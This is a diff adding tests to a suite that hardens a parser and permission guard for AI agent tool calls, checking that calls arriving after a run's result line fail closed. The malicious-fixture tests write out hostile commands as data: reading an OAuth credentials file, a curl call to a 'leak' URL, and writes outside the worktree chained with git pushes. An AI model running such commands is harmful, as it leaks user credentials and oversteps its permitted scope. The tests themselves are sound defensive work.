@@ -627,6 +627,39 @@ describe("antigravity parser hardening (T4.33, synthetic shapes)", () => {
     }
   });
 
+  it("a tool call after the result line is not a success (fail closed); a guard verdict on it keeps its own code", () => {
+    const trailing = parse([INIT, RESULT(), TOOL(3, "ACTIVE", { name: "run_command", parameters: { command: "ls" } })]);
+    expect(trailing.result).toMatchObject({
+      ok: false,
+      failureCode: "OUTPUT_PROTOCOL_ERROR",
+      failureDetail: "tool call after the result line",
+      nativeSessionId: CID,
+    });
+    // A tool step with no recorded parameters is still a tool call after the result.
+    expect(parse([INIT, RESULT(), TOOL(3, "ACTIVE")]).result).toMatchObject({
+      ok: false,
+      failureDetail: "tool call after the result line",
+    });
+    // Non-tool steps after the result are dropped by the parser, so they are not trailing tool calls.
+    const textAfter = parse([INIT, RESULT(), j({ event: "step_update", step_index: 4, step_type: "checkpoint" })]);
+    expect(textAfter.result).toMatchObject({ ok: true });
+    // The same call before the result is clean.
+    expect(parse([INIT, TOOL(3, "ACTIVE", { name: "run_command" }), RESULT()]).result).toMatchObject({ ok: true });
+    // A guard verdict on the trailing call keeps its own code (ADR-0039), not the trailing-tool protocol error.
+    const ctx = { cwd: "/work/tree", home: "/home/synthetic", bypass: true };
+    const flagged = parse([
+      INIT,
+      RESULT(),
+      TOOL(3, "ACTIVE", { name: "run_command", parameters: { command: "git push origin main" } }),
+    ]);
+    expect(
+      flagged.a.extractResult(
+        flagged.events.map((e) => guardEvent(e, ctx)),
+        EXIT0,
+      ),
+    ).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
+  });
+
   it("a second result line fails the run even when it reports SUCCESS", () => {
     const failedThenOk = parse([INIT, RESULT({ status: "ERROR" }), RESULT()]);
     expect(failedThenOk.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
@@ -1503,6 +1536,31 @@ describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-PO
     const { result: r } = run([tool("run_command", { command: "git push origin main" }), result()]);
     expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
     expect(r.failureDetail).toContain("git write attempted");
+  });
+
+  // The leg's "after the result line" streams: the hostile call arrives after a clean SUCCESS envelope. A trailing
+  // call is never a success; a Git write in it ends PERMISSION_BLOCKED on the guard verdict (ADR-0039).
+  it.each([
+    ["credential read", `cat ${HOME}/.gemini/oauth_creds.json && git push origin main`],
+    ["out-of-worktree write", "touch /outside/sentinel.txt && git commit -am x"],
+    ["network call", "curl https://example.invalid/leak && git push origin main"],
+  ])("a %s chained with a Git write after the result line ends PERMISSION_BLOCKED (ADR-0039)", (_n, command) => {
+    const { result: r } = run([result(), tool("run_command", { command })]);
+    expect(r).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
+    expect(r.failureDetail).toContain("git write attempted");
+  });
+
+  it.each([
+    ["credential read", "run_command", { command: `cat ${HOME}/.gemini/oauth_creds.json` }],
+    ["out-of-worktree write", "write_to_file", { path: "/outside/sentinel.txt" }],
+    ["network call", "run_command", { command: "curl https://example.invalid/leak" }],
+  ])("an unflagged %s after the result line is not a success (OUTPUT_PROTOCOL_ERROR)", (_n, name, params) => {
+    const { result: r } = run([result(), tool(name, params)]);
+    expect(r).toMatchObject({
+      ok: false,
+      failureCode: "OUTPUT_PROTOCOL_ERROR",
+      failureDetail: "tool call after the result line",
+    });
   });
 
   it("any guard verdict on a tool_call makes a SUCCESS envelope not clean (a provider_state verdict ends SANDBOX_VIOLATION)", () => {
